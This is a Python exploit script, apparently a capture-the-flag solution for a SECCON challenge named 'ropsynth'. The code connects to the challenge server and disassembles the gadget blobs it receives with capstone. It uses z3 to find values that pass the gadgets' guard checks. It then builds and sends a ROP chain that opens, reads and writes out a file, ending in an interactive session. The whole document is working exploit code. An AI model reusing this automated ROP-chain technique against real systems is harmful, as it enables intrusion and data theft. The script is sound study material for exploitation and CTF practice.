from socket import *
from pwn import *
from capstone import *
from z3 import *
import re
import os
import base64

context.arch = 'amd64'
context.bits = 64

csc = Cs(CS_ARCH_X86, CS_MODE_64)

stage = remote('ropsynth.pwn.seccon.jp', 10000)

for i in range(5):
	stage.recvline()
	gadgets = stage.recvline().decode('base64')
	gadgets = gadgets.ljust(4096, '\xcc')
	f = open('gadget.bin', 'wb')
	f.write(gadgets)
	f.close()

	source = """.intel_syntax noprefix
	.globl _start

	.align 0x1000
	_start:
	.incbin "gadget.bin"
	"""


	with open("gadget.s", 'w') as f:
	    f.write(source)

	os.system('gcc gadget.s -o gadget -nostdlib -m64')

	pieces = dict(pop_rsi='\x5e',
	pop_rax='\x58',
	mov_rdx_rax='\x50\x5a',
	mov_rdi_rax='\x50\x5f',
	syscall='\x0f\x05')
	gadgetbase = 0x00800000
	reg = BitVec('r', 64)
	for name, gadget in pieces.items():
		gadgetoffset = gadgets.find('\xf4' + gadget)+1+len(gadget)
		found = False
		pieces[name] = [p64(gadgetbase + gadgetoffset - len(gadget)), '']
		print name, '=' * 80
		while not found:
			disasm = csc.disasm(gadgets[gadgetoffset:], gadgetbase + gadgetoffset)
			cs = []
			for c in disasm:
				print hex(c.address) + ' ' + c.mnemonic + ' ' + c.op_str
				if c.mnemonic == 'je':
					gadgetoffset = int(c.op_str, 16) - gadgetbase
					break
				if c.mnemonic == 'ret':
					found = True
					break
				cs.append(c)
			if found == False:
				cond = None
				r = reg
				for c in cs:
					if c.mnemonic == 'pop':
						r = reg
					else:
						imm = int(c.op_str.split(',')[1].strip(), 16)
						if c.mnemonic == 'xor':
							r ^= imm
						elif c.mnemonic == 'sub':
							r -= imm
						elif c.mnemonic == 'add':
							r += imm
						elif c.mnemonic == 'cmp':
							cond = r == imm
							break
						else:
							print c.mnemonic
							exit()
				s = Solver()
				s.add(cond)
				print cond
				if s.check() == sat:
					pieces[name][1] += p64(s.model()[reg].as_long())
				else:
					print 'unsat'
					exit()

	g = lambda *x: pieces[x[0]][0] + ''.join(p64(a) for a in x[1:]) + pieces[x[0]][1]

	rop = g('pop_rax', 0x00a00000) + g('mov_rdi_rax') + g('pop_rax', 0) + g('mov_rdx_rax') + g('pop_rsi', 0) + g('pop_rax', 2) + g('syscall') + g('mov_rdi_rax') + g('pop_rsi', 0x00a00000) + g('pop_rax', 256) + g('mov_rdx_rax') + g('pop_rax', 0) + g('syscall') + g('mov_rdx_rax') + g('pop_rax', 1) + g('mov_rdi_rax') + g('syscall') + g('pop_rax', 231) + g('syscall')
	rop = rop.ljust(4096, '\xff')

	f = open('rop.bin', 'wb')
	f.write(rop)
	f.close()

	print pieces
	print `rop`, len(rop)

	stage.send(base64.b64encode(rop) + '\n')
	print stage.recvline()
stage.interactive()